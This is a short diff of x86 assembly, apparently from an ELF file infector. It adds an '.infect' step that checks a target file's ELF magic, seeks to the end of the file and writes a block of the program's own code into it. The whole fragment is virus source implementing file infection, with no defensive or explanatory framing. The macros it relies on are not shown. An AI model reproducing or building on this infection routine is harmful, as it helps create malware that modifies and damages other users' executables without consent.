@@ -92,10 +92,12 @@ _start:
     cmp byte[ebp-8+3],'F'; elfmago3
     jne .print_Failstr;
 
-	mov edx, _start.print_OutStr-_start.nopnop
+	.infect:
 	lseek dword[ebp-4], 0, SEEK_END ; get to end of file
+	
+	mov edx, _start.nopnop
+	sub edx, _start.print_OutStr
 	write dword[ebp-4], .print_OutStr, edx ; write the print command
-
 
 	.print_OutStr:
 		print_OutStr
